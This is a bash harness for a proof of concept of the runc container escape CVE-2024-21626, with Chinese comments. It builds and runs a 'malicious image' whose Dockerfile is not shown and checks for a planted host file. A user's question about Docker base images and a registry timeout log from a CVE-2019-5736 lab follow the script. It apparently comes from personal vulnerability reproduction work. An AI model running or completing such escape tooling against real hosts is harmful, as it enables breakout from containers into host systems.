#!/bin/bash
# cve-2024-21626-poc/run_poc.sh

set -e

POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUTPUT_FILE="/tmp/pwned_by_cve_2024_21626"

echo "[*] CVE-2024-21626 复现脚本"
echo "[*] 注意：仅在 runc < 1.1.12 的环境中有效"

# 检查 runc 版本
if ! command -v runc &> /dev/null; then
    echo "[-] runc 未安装"
    exit 1
fi

RUNC_VERSION=$(runc --version | head -n1 | awk '{print $NF}')
echo "[+] 当前 runc 版本: $RUNC_VERSION"

# 版本比较（简单判断）
if [[ "$RUNC_VERSION" =~ ^v?1\.1\.(1[2-9]|[2-9][0-9]*) ]]; then
    echo "[-] runc 版本 >= 1.1.12，已修复漏洞，无法复现"
    exit 1
fi

# 清理旧文件
rm -f "$OUTPUT_FILE"

# 构建镜像
echo "[*] 构建恶意镜像..."
docker build -t cve-2024-21626-poc "$POC_DIR"

# 运行容器（不加 --rm，便于调试）
echo "[*] 启动容器..."
docker run --name cve2024_test cve-2024-21626-poc

# 等待容器退出
sleep 2

# 检查是否逃逸成功
if [ -f "$OUTPUT_FILE" ]; then
    echo "[!!!] 成功！检测到宿主机文件: $OUTPUT_FILE"
    cat "$OUTPUT_FILE"
else
    echo "[-] 未检测到逃逸文件（可能环境已修复或 PoC 不完整）"
    echo "    请确认 runc 版本 < 1.1.12，并检查 Docker 是否使用该 runc"
fi

# 清理
docker rm -f cve2024_test 2>/dev/null || true
docker rmi cve-2024-21626-poc 2>/dev/null || true



直接使用FROM ubuntu:20.04老是出现问题，能否考虑其他容器方案：herbert@ubuntu:~/container-lab/cves/CVE-2019-5736$ uname -v
#149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025
Sending build context to Docker daemon  9.728kB
Step 1/9 : FROM ubuntu:18.04
Get "https://registry-1.docker.io/v2/": net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)